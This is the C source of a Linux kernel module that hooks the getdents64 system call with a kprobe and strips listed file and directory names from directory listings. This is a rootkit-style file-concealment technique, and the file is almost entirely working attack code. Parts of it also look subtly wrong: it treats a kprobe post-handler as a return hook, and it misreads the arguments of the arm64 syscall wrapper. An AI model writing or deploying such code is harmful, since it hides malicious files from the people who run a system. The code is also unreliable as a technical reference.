/*
 * hook_manager.c - Hook core manager
 * File hiding module - 使用 kprobe hook getdents64
 */

#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#include "hook.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("HOOK");
MODULE_DESCRIPTION("File Hiding Module");
MODULE_VERSION("1.0");

/* Hidden file/folder storage */
static struct hidden_entry hidden_files[MAX_HIDDEN_FILES];
static int hidden_count;
static DEFINE_SPINLOCK(hidden_lock);

/* Debug flag - set to 1 for verbose logging */
static int debug_enabled = 1;
module_param(debug_enabled, int, 0644);

/* Directory entry structure */
struct linux_dirent64 {
	u64 d_ino;
	s64 d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[256];
};

/* Kprobe for getdents64 */
static struct kprobe kp_getdents64;

int add_hidden_file(const char *name, bool is_dir)
{
	unsigned long flags;
	int i;

	if (!name || strlen(name) >= sizeof(hidden_files[0].name))
		return -EINVAL;

	spin_lock_irqsave(&hidden_lock, flags);

	for (i = 0; i < hidden_count; i++) {
		if (hidden_files[i].active &&
		    strcmp(hidden_files[i].name, name) == 0 &&
		    hidden_files[i].is_dir == is_dir) {
			spin_unlock_irqrestore(&hidden_lock, flags);
			return -EEXIST;
		}
	}

	if (hidden_count >= MAX_HIDDEN_FILES) {
		spin_unlock_irqrestore(&hidden_lock, flags);
		return -ENOSPC;
	}

	strcpy(hidden_files[hidden_count].name, name);
	hidden_files[hidden_count].is_dir = is_dir;
	hidden_files[hidden_count].active = true;
	hidden_count++;

	spin_unlock_irqrestore(&hidden_lock, flags);
	pr_info("[hidefile] add hidden %s: %s\n", is_dir ? "dir" : "file", name);
	return 0;
}

int remove_hidden_file(const char *name)
{
	unsigned long flags;
	int i;

	spin_lock_irqsave(&hidden_lock, flags);

	for (i = 0; i < hidden_count; i++) {
		if (hidden_files[i].active &&
		    strcmp(hidden_files[i].name, name) == 0) {
			hidden_files[i].active = false;
			spin_unlock_irqrestore(&hidden_lock, flags);
			pr_info("[hidefile] remove hidden: %s\n", name);
			return 0;
		}
	}

	spin_unlock_irqrestore(&hidden_lock, flags);
	return -ENOENT;
}

bool is_hidden(const char *name, bool is_dir)
{
	unsigned long flags;
	bool found = false;
	int i;

	if (!name)
		return false;

	spin_lock_irqsave(&hidden_lock, flags);

	for (i = 0; i < hidden_count; i++) {
		if (hidden_files[i].active &&
		    hidden_files[i].is_dir == is_dir &&
		    strcmp(hidden_files[i].name, name) == 0) {
			found = true;
			break;
		}
	}

	spin_unlock_irqrestore(&hidden_lock, flags);
	return found;
}

void clear_hidden_list(void)
{
	unsigned long flags;
	int i;

	spin_lock_irqsave(&hidden_lock, flags);

	for (i = 0; i < hidden_count; i++)
		hidden_files[i].active = false;
	hidden_count = 0;

	spin_unlock_irqrestore(&hidden_lock, flags);
	pr_info("[hidefile] hidden list cleared\n");
}

/* Kprobe pre_handler - called before getdents64 executes */
static int kp_pre_handler(struct kprobe *p, struct pt_regs *regs)
{
	/* Nothing to do here - we log in post_handler only to avoid log flood */
	return 0;
}

/* Kprobe post_handler - called after getdents64 returns */
static void kp_post_handler(struct kprobe *p, struct pt_regs *regs,
			   unsigned long flags)
{
	struct linux_dirent64 __user *dirent;
	struct linux_dirent64 *kbuf = NULL;
	struct linux_dirent64 *curr, *write_ptr;
	int count, new_count;
	char name[256];
	int entries_hidden = 0;
	int entries_total = 0;
	int i;

	/* Get return value (x0 on arm64) */
	count = (int)regs->regs[0];

	if (count <= 0)
		return;

	/* Get arguments */
	dirent = (struct linux_dirent64 __user *)regs->regs[1];

	if (debug_enabled) {
		pr_info("[hidefile] getdents64 returned: ret=%d, hidden_count=%d\n", count, hidden_count);

		/* Print hidden list */
		for (i = 0; i < hidden_count; i++) {
			if (hidden_files[i].active)
				pr_info("[hidefile]   hidden[%d]: %s (%s)\n",
					i, hidden_files[i].name,
					hidden_files[i].is_dir ? "DIR" : "FILE");
		}
	}

	/* Allocate kernel buffer */
	kbuf = kmalloc(count + 256, GFP_ATOMIC);
	if (!kbuf)
		return;

	/* Copy from user space */
	if (copy_from_user(kbuf, dirent, count)) {
		pr_err("[hidefile] copy_from_user failed\n");
		kfree(kbuf);
		return;
	}

	/* Filter hidden entries */
	curr = kbuf;
	write_ptr = kbuf;
	new_count = 0;

	while (curr < kbuf + count) {
		unsigned short reclen = curr->d_reclen;

		if (reclen == 0)
			break;

		memset(name, 0, sizeof(name));
		strncpy(name, curr->d_name, sizeof(name) - 1);
		entries_total++;

		if (debug_enabled) {
			pr_info("[hidefile]   [%d] %s (%s)\n",
				entries_total, name,
				curr->d_type == DT_DIR ? "DIR" : "FILE");
		}

		if (is_hidden(name, curr->d_type == DT_DIR)) {
			entries_hidden++;
			if (debug_enabled)
				pr_info("[hidefile]   --> MATCHED (will hide): %s\n", name);
		} else {
			/* Keep this entry */
			if (write_ptr != curr)
				memcpy(write_ptr, curr, reclen);
			write_ptr = (struct linux_dirent64 *)((char *)write_ptr + reclen);
			new_count += reclen;
		}

		curr = (struct linux_dirent64 *)((char *)curr + reclen);
	}

	pr_info("[hidefile] === RESULT: total=%d, hidden=%d, returned=%d ===\n",
		entries_total, entries_hidden, new_count);

	/* Copy back if entries were hidden */
	if (new_count < count) {
		if (copy_to_user(dirent, kbuf, new_count)) {
			pr_err("[hidefile] copy_to_user failed\n");
		} else {
			/* Modify return value */
			regs->regs[0] = new_count;
			pr_info("[hidefile] return value modified: %d --> %d\n", count, new_count);
		}
	}

	kfree(kbuf);
}

/* External vfs hook functions */
extern int vfs_hook_init(void);
extern void vfs_hook_exit(void);

static bool kprobe_registered;

static int __init hook_init(void)
{
	int ret;

	pr_info("[hidefile] initializing...\n");

	/* Setup kprobe for getdents64 */
#ifdef __aarch64__
	kp_getdents64.symbol_name = "__arm64_sys_getdents64";
#else
	kp_getdents64.symbol_name = "do_getdents64";
#endif

	kp_getdents64.pre_handler = kp_pre_handler;
	kp_getdents64.post_handler = kp_post_handler;

	ret = register_kprobe(&kp_getdents64);
	if (ret < 0) {
		pr_err("[hidefile] failed to register kprobe: %d\n", ret);
		return ret;
	}

	kprobe_registered = true;
	pr_info("[hidefile] kprobe registered at %px\n", kp_getdents64.addr);

	ret = vfs_hook_init();
	if (ret < 0)
		pr_warn("[hidefile] vfs_hook_init failed: %d\n", ret);

	pr_info("[hidefile] module initialized\n");
	return 0;
}

static void __exit hook_exit(void)
{
	if (kprobe_registered) {
		unregister_kprobe(&kp_getdents64);
		pr_info("[hidefile] kprobe unregistered\n");
	}

	vfs_hook_exit();
	clear_hidden_list();
	pr_info("[hidefile] module exited\n");
}

module_init(hook_init);
module_exit(hook_exit);
